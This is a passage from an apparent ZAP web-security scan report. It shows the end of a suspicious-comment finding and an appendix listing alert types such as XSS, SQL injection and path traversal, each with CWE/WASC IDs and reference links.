          The following pattern was used: \bFROM\b and was detected in the element starting with: "<script>function process(data) {alert("Surname(s) from JSON results: " + Object.keys(data).map(function(k) {return data[k]}));};", see evidence field for the suspicious comment/snippet.

Appendix

Alert types

This section contains additional information on the types of alerts in the report.

  1. Cross Site Scripting (Reflected)

    Source raised by an active scanner (Cross Site Scripting (Reflected))
    CWE ID 79
    WASC ID 8
    Reference
    1. http://projects.webappsec.org/Cross-Site-Scripting
    2. http://cwe.mitre.org/data/definitions/79.html

  2. External Redirect

    Source raised by an active scanner (External Redirect)
    CWE ID 601
    WASC ID 38
    Reference
    1. http://projects.webappsec.org/URL-Redirector-Abuse
    2. http://cwe.mitre.org/data/definitions/601.html

  3. Obchodzenie Ścieżki

    Source raised by an active scanner (Obchodzenie Ścieżki)
    CWE ID 22
    WASC ID 33
    Reference
    1. http://projects.webappsec.org/Path-Traversal
    2. http://cwe.mitre.org/data/definitions/22.html

  4. SQL Injection - SQLite

    Source raised by an active scanner (SQL Injection)
    CWE ID 89
    WASC ID 19
    Reference
    1. https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html

  5. Zdalne włączanie plików

    Source raised by an active scanner (Zdalne włączanie plików)
    CWE ID 98
    WASC ID 5
    Reference
    1. http://projects.webappsec.org/Remote-File-Inclusion
    2. http://cwe.mitre.org/data/definitions/98.html

  6. Missing Anti-clickjacking Header

    Source raised by a passive scanner (Anti-clickjacking Header)
    CWE ID 1021
    WASC ID 15
    Reference
    1. https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options

  7. Przepełnienie bufora

    Source raised by an active scanner (Przepełnienie bufora)
    CWE ID 120
    WASC ID 7
    Reference
    1. https://owasp.org/www-community/attacks/Buffer_overflow_attack

  8. Absence of Anti-CSRF Tokens

    Source raised by a passive scanner (Absence of Anti-CSRF Tokens)
    CWE ID 352
    WASC ID 9
    Reference
    1. http://projects.webappsec.org/Cross-Site-Request-Forgery
    2. http://cwe.mitre.org/data/definitions/352.html

  9. Application Error Disclosure

    Source raised by a passive scanner (Application Error Disclosure)
    CWE ID 200
    WASC ID 13

  10. Timestamp Disclosure - Unix

    Source raised by a passive scanner (Timestamp Disclosure)
    CWE ID 200
    WASC ID 13
    Reference
    1. http://projects.webappsec.org/w/page/13246936/Information%20Leakage

  11. X-Content-Type-Options Header Missing

    Source raised by a passive scanner (X-Content-Type-Options Header Missing)
    CWE ID 693
    WASC ID 15
    Reference
    1. http://msdn.microsoft.com/en-us/library/ie/gg622941%28v=vs.85%29.aspx
    2. https://owasp.org/www-community/Security_Headers

  12. Information Disclosure - Sensitive Information in URL

    Source raised by a passive scanner (Information Disclosure - Sensitive Information in URL)
    CWE ID 200
    WASC ID 13

  13. Information Disclosure - Suspicious Comments

    Source raised by a passive scanner (Information Disclosure - Suspicious Comments)
    CWE ID 200
    WASC ID 13
